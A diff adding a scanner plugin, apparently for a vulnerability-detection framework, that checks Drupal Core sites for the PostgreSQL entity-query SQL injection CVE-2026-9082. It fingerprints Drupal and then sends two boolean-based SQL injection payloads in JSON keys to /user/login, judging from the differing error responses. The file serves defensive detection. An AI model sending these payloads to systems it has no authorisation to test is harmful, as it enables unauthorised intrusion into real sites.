@@ -1,0 +1,103 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "DrupalCore_CVE_2026_9082"
+  author: "sanjaymahajan14"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-9082"
+  }
+  severity: CRITICAL
+  title: "Drupal Core PostgreSQL Entity Query SQL Injection"
+  description: "A SQL injection vulnerability exists in Drupal Core when configured with a PostgreSQL database backend. Unauthenticated attackers can inject arbitrary SQL queries via unsanitized associative array keys in condition filters processed through endpoints such as JSON:API or user login."
+  recommendation: "Upgrade Drupal Core to 10.4.10, 10.5.10, 10.6.9, 11.1.10, 11.2.12, 11.3.10, or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-9082"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_drupal"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "Drupal" },
+          { body: {} contains: "drupal" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "probe_user_login_sqli_true"
+  http_request: {
+    method: POST
+    uri: "/user/login?_format=json&check=1"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":{\"0\":\"x\",\"0||1/(SELECT CASE WHEN (1=1) THEN 0 END)\":\"x\"},\"pass\":\"x\"}"
+    response: {
+      http_status: 500
+      expect_any: {
+        conditions: [
+          { body: {} contains: "unexpected error" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "probe_user_login_sqli_false"
+  http_request: {
+    method: POST
+    uri: "/user/login?_format=json&check=2"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":{\"0\":\"x\",\"0||1/(SELECT CASE WHEN (1=2) THEN 0 END)\":\"x\"},\"pass\":\"x\"}"
+    response: {
+      http_status: 400
+      expect_all: {
+        conditions: [
+          { body: {} contains: "unrecognized" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_drupal",
+    "probe_user_login_sqli_true",
+    "probe_user_login_sqli_false"
+  ]
+}
